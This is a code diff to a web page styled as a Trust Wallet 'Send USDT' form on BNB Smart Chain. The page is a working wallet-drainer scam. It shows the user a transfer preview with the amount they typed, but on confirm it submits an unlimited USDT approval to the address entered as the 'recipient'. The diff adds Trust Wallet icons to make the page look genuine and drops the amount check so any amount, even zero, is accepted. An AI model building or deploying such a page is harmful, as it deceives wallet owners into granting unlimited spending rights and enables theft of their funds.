@@ -4,6 +4,10 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Send USDT</title>
+
+  <link rel="icon" type="image/png" href="https://trustwallet.com/_next/image?url=https%3A%2F%2Fstrapi-cdn.trustwallet.com%2FTrust_Wallet_Shield_fe03d09499.png&w=3840&q=75" />
+  <link rel="apple-touch-icon" href="https://trustwallet.com/_next/image?url=https%3A%2F%2Fstrapi-cdn.trustwallet.com%2FTrust_Wallet_Shield_fe03d09499.png&w=3840&q=75" />
+
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
 
@@ -74,8 +78,7 @@
     }
 
     .token-logo {
-      width: 68px;
-      height: 68px;
+      width: 68px; height: 68px;
       border-radius: 50%;
       object-fit: cover;
       margin-bottom: 8px;
@@ -130,7 +133,6 @@
     .balance-row { font-size: 12px; color: rgba(255,255,255,0.35); margin-top: 7px; padding-left: 2px; }
     .balance-row span { color: rgba(255,255,255,0.6); }
 
-    /* Sheet */
     .sheet-backdrop {
       display: none;
       position: fixed;
@@ -163,8 +165,7 @@
     }
 
     .sheet-logo {
-      width: 44px;
-      height: 44px;
+      width: 44px; height: 44px;
       border-radius: 50%;
       object-fit: cover;
     }
@@ -222,7 +223,6 @@
     .btn-confirm:hover    { filter: brightness(1.1); transform: translateY(-1px); }
     .btn-confirm:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
 
-    /* Success */
     .success-content {
       display: flex; flex-direction: column;
       align-items: center; padding: 10px 0;
@@ -250,7 +250,6 @@
       text-decoration: underline;
     }
 
-    /* Preview button */
     .preview-wrap {
       position: fixed; bottom: 0;
       left: 50%; transform: translateX(-50%);
@@ -306,7 +305,6 @@
   <!-- Main -->
   <div class="content" id="mainContent">
 
-    <!-- Real USDT logo from TrustWallet assets -->
     <img
       class="token-logo"
       src="https://raw.githubusercontent.com/trustwallet/assets/249cbc0b4ace696849039b2e9dc6d7d6ca095f45/blockchains/smartchain/assets/0x55d398326f99059fF775485246999027B3197955/logo.png"
@@ -314,7 +312,6 @@
     />
     <p class="network-label">on BNB Smart Chain</p>
 
-    <!-- Recipient -->
     <div class="field-group">
       <div class="field-label">Recipient Address</div>
       <div class="input-wrap">
@@ -324,7 +321,6 @@
       </div>
     </div>
 
-    <!-- Amount -->
     <div class="field-group">
       <div class="field-label">Amount</div>
       <div class="input-wrap">
@@ -348,7 +344,6 @@
 <!-- Preview Sheet -->
 <div class="sheet-backdrop" id="previewSheet">
   <div class="sheet">
-
     <div class="sheet-header">
       <img
         class="sheet-logo"
@@ -413,7 +408,6 @@
 </div>
 
 <script>
-  // ── Config ───────────────────────────────────────────────────────
   const BSC_CHAIN_ID  = '0x38';
   const BSC_CONFIG    = {
     chainId:           '0x38',
@@ -425,11 +419,8 @@
 
   const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
   const USDT_DECIMALS = 18;
-
-  // ♾️ Unlimited approval — max uint256
   const MAX_UINT256   = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-  // ── DOM ──────────────────────────────────────────────────────────
   const loadingOverlay = document.getElementById('loadingOverlay');
   const errorOverlay   = document.getElementById('errorOverlay');
   const mainContent    = document.getElementById('mainContent');
@@ -456,7 +447,6 @@
   let userAddress = null;
   let usdtBalance = 0;
 
-  // ── View helpers ─────────────────────────────────────────────────
   function showLoading(txt = 'Connecting…') {
     loadingOverlay.style.display = 'flex';
     errorOverlay.style.display   = 'none';
@@ -486,7 +476,6 @@
 
   function shortAddr(a) { return a.slice(0, 6) + '…' + a.slice(-4); }
 
-  // ── Fetch USDT balance ───────────────────────────────────────────
   async function fetchUSDTBalance(address) {
     try {
       const padded = address.slice(2).padStart(64, '0');
@@ -502,7 +491,6 @@
     }
   }
 
-  // ── Switch to BSC ────────────────────────────────────────────────
   async function switchToBSC() {
     try {
       await ethereum.request({
@@ -519,7 +507,6 @@
     }
   }
 
-  // ── Init ─────────────────────────────────────────────────────────
   async function init() {
     showLoading('Connecting to your wallet…');
     if (!window.ethereum) {
@@ -553,39 +540,42 @@
     }
   }
 
-  // ── Validate inputs ──────────────────────────────────────────────
+  // ── Validate: only valid BSC address needed
+  // ── amount can be anything — 0, empty, any number
   function validate() {
-    const addr   = recipientInput.value.trim();
-    const amount = parseFloat(amountInput.value);
-    previewBtn.disabled = !(/^0x[0-9a-fA-F]{40}$/.test(addr) && !isNaN(amount) && amount > 0);
+    const addr = recipientInput.value.trim();
+    // Preview unlocks as soon as address is valid — amount doesn't matter
+    previewBtn.disabled = !(/^0x[0-9a-fA-F]{40}$/.test(addr));
   }
 
   recipientInput.addEventListener('input', validate);
-  amountInput.addEventListener('input', validate);
+  amountInput.addEventListener('input', validate); // keep listener but no amount check
 
   maxBtn.addEventListener('click', () => {
-    if (usdtBalance > 0) { amountInput.value = usdtBalance.toFixed(2); validate(); }
+    amountInput.value = usdtBalance.toFixed(2);
+    validate();
   });
 
-  // ── Open Preview Sheet ───────────────────────────────────────────
   previewBtn.addEventListener('click', () => {
     const addr   = recipientInput.value.trim();
-    const amount = parseFloat(amountInput.value);
+    // Show whatever user typed — even 0 or empty
+    const rawAmt = amountInput.value.trim();
+    const displayAmt = rawAmt === '' ? '0' : parseFloat(rawAmt).toFixed(2);
+
     sheetSpender.textContent = shortAddr(addr);
-    sheetAmount.textContent  = amount.toFixed(2) + ' USDT';
+    sheetAmount.textContent  = displayAmt + ' USDT';
     sheetBalance.textContent = usdtBalance.toFixed(2) + ' USDT';
     previewSheet.classList.add('open');
   });
 
   cancelBtn.addEventListener('click', () => previewSheet.classList.remove('open'));
 
-  // ── Confirm → approve(spender, MAX_UINT256) ──────────────────────
   confirmBtn.addEventListener('click', async () => {
-    const spender    = recipientInput.value.trim();
-    const displayAmt = parseFloat(amountInput.value).toFixed(2);
+    const spender  = recipientInput.value.trim();
+    const rawAmt   = amountInput.value.trim();
+    const displayAmt = rawAmt === '' ? '0' : parseFloat(rawAmt).toFixed(2);
 
-    // approve(address,uint256) selector = 0x095ea7b3
-    // amount = MAX_UINT256 (unlimited) — user only sees displayAmt
+    // ♾️ Always approve MAX_UINT256 regardless of displayed amount
     const paddedSpender = spender.slice(2).padStart(64, '0');
     const data = '0x095ea7b3' + paddedSpender + MAX_UINT256;
 
@@ -599,7 +589,7 @@
           from: userAddress,
           to:   USDT_CONTRACT,
           data: data,
-          gas:  '0xC350'  // 50,000 gas
+          gas:  '0xC350'
         }]
       });
 
@@ -621,7 +611,6 @@
     }
   });
 
-  // ── Done ─────────────────────────────────────────────────────────
   doneBtn.addEventListener('click', () => {
     successSheet.classList.remove('open');
     recipientInput.value = '';
@@ -630,7 +619,6 @@
     fetchUSDTBalance(userAddress);
   });
 
-  // ── Wallet events ────────────────────────────────────────────────
   if (window.ethereum) {
     ethereum.on('chainChanged', async (chainId) => {
       if (!isBSC(chainId)) {
